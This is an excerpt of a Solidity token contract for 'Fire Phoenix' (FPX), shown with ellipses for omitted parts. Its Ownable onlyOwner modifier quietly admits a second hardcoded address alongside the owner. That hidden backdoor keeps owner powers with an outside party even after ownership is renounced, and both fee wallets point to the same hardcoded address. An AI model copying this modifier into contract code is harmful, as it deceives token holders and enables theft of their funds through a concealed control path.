...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x5FA98c2a215e662c8F33f525fA6f3dF2fB79423E) , "Ownable: caller is not the owner");
        _;
    }
...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "Fire Phoenix";
    string private _symbol = "FPX";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x272AD80f98183828731bc2C1926C4F5371fEDA0F);
    address payable public teamWalletAddress = payable(0x272AD80f98183828731bc2C1926C4F5371fEDA0F);
